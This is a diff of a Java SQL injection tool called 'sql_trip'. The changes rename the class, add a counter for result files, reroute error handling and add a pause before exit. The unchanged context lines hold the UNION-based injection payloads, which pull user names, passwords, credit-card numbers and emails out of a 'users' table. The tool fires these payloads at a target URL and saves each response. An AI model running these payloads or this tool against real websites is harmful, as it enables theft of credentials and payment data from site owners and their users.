@@ -1,6 +1,6 @@
 import java.io.*;
 import java.net.*;
-class sql_trip extends ConsoleColors
+class sql_trip_withconsolecolor extends ConsoleColors
 {
 public static void main(String [] args)throws Exception
 {
@@ -43,7 +43,7 @@ String sql_commands[]={" order by 1"," union all select 1,2"," union all select 
 " union select 1,group_concat(uname),3 from users"," union select 1,group_concat(pass),3 from users",
 " union select 1,group_concat(cc),3 from users"," union select 1,group_concat(email),3 from users"};
 //String table_name=new String[];
-int k;
+int k,indexcounter=0;
 for(k=0;k<(sql_commands.length);k++)
 {
 s1=s+sql_commands[k]+end;
@@ -68,8 +68,9 @@ System.out.println(urlString); System.out.print("\n\n\n");
 if((urlString.indexOf("Error"))>=0 || (urlString.indexOf("ERROR"))>=0 || (urlString.indexOf("error"))>=0 ||(urlString.indexOf("warning"))>=0 ||
 (urlString.indexOf("WARNING"))>=0 ||(urlString.indexOf("Warning"))>=0)
 {System.out.print(ConsoleColors.GREEN_BOLD+"\n\n Error Based SQL Injection might be possible\n\n"+ConsoleColors.RESET); }
-BufferedWriter writer1 = new BufferedWriter(new FileWriter("urlsqltrip_demo"+k+".txt"));
-BufferedWriter writer2 = new BufferedWriter(new FileWriter("urlsqltrip_demo"+k+".html"));
+else {
+BufferedWriter writer1 = new BufferedWriter(new FileWriter("urlsqltrip_result"+indexcounter+".txt"));
+BufferedWriter writer2 = new BufferedWriter(new FileWriter("urlsqltrip_result"+indexcounter+".html"));
 writer1.write(urlString);
 writer2.write(urlString);
 /*writer1.append(' ');
@@ -80,8 +81,10 @@ writer1.append(urlString);*/
 writer1.close();
 writer2.close();
 s1="";
+indexcounter++;
+}//end of else
 if(k==(sql_commands.length)-1)
-{ System.out.print(ConsoleColors.GREEN_BOLD+"\n Program Ended.. Check Generated HTML Files in the same Directory..\n\n\n"+ConsoleColors.RESET);}
+{ System.out.print(ConsoleColors.GREEN_BOLD+"\n Program Ended.. Check Generated HTML Files named \"urlsqltrip_result\" indexed as 0,1,2,... in the same Directory..\n\n\n"+ConsoleColors.RESET);}
 }
 
 
@@ -91,7 +94,9 @@ if(k==(sql_commands.length)-1)
 else if(choice.equalsIgnoreCase("author")||choice.equals("a")||choice.equals("A")||choice.equalsIgnoreCase("auth"))
 {
 authorinfo(); }
-else { System.out.print(ConsoleColors.RED_BOLD+"\n\n SQL Trip not started... Exiting..Program Stopped..\n\n\n"+ConsoleColors.RESET); System.exit(0);}
+else { System.out.print(ConsoleColors.RED_BOLD+"\n\n SQL Trip not started... Exiting..Program Stopped..\n\n\n"+ConsoleColors.RESET); 
+Thread.sleep(1500);
+System.exit(0);}
 }
 
 
